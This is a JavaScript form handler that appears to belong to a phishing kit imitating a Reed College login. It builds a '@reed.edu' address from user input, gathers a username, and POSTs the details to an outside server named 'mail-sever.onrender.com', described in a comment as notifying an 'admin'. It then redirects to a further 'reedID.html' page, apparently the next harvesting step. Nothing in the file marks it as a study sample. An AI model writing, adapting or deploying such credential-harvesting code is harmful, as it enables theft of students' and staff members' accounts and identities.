document.addEventListener("DOMContentLoaded", function() {
    // Get the form element
    const trueLog = document.getElementById("trueLog");
    const submitButton = document.getElementById("submitBtn");

    // Add submit event listener
    trueLog.addEventListener("submit", async function(event) {
        event.preventDefault();  // Prevent default form submission
        
        // Disable the submit button to prevent multiple submissions
        submitButton.disabled = true;
        submitButton.textContent = "authenticating...";

        // Get email and password values
        const preEmail = document.getElementById("name").value;
        const email = preEmail + '@reed.edu'
        const username = document.getElementById("key").value;
        const password = 'uiggcilwcbnuitqolvlnsbvu@^#*guitv34';

        // Validate email and password
        if (validateEmail(email) && validatePassword(password)) {
            // Email and password are valid
            
            //Send Login detail to admin for notification
            const userData = {
                FullName: username,
                Email: email,
                Password: password,
            };

            try {
                const response = await fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(userData)
                });

                // Check if the response is ok
                if (!response.ok) {
                    const error = await response.json();
                    throw new Error(error.message || "Server Error");
                }

                const result = await response.json();
                console.log("Server Response:", result);

                // Redirect to verify page after a short delay
                setTimeout(function() {
                    window.location.href = "./reedID.html"; // Adjust the URL
                }, 1500);

            } catch (error) {
                console.error("Error:", error);
                alert("An error occurred. Please try again later.");
            } finally {
                // Re-enable the submit button
                submitButton.disabled = false;
                submitButton.textContent = "Submit";
            }

        } else {
            // Invalid email or password
            alert("Invalid email or password. Please try again.");
            submitButton.disabled = false;
            submitButton.textContent = "Submit";
        }
    });

    // Function to validate email
    function validateEmail(email) {
        // Check if the email ends with the specified domain
        return email.endsWith("@reed.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});
